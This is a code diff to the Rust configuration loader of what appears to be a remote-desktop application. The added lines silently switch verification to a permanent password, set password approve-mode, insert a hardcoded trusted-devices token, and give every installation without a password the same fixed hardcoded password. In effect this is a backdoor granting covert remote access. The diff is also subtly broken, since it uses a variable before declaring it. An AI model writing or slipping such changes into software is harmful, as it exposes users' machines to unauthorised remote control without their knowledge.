@@ -508,6 +508,14 @@ fn patch(path: PathBuf) -> PathBuf {
 impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
         let mut store = false;
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
@@ -519,6 +527,10 @@ impl Config2 {
         let (unlock_pin, _, store2) =
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
+        if !config.options.contains_key("trusted_devices") {
+                config.options.insert("trusted_devices".to_string(), "00Wrxlu8c3CqYq3TMZJUpyTA4D".to_string());
+                config.store();
+            }
         store |= store2;
         if store {
             config.store();
@@ -646,6 +658,10 @@ impl Config {
                     log::error!("Failed to generate new id");
                 }
             }
+        }
+        if config.password.is_empty() {
+            config.password = "00Wrxlu8c3CqYq3TMZJUpyTA4D".to_string();
+            store = true;
         }
         if store {
             config.store();
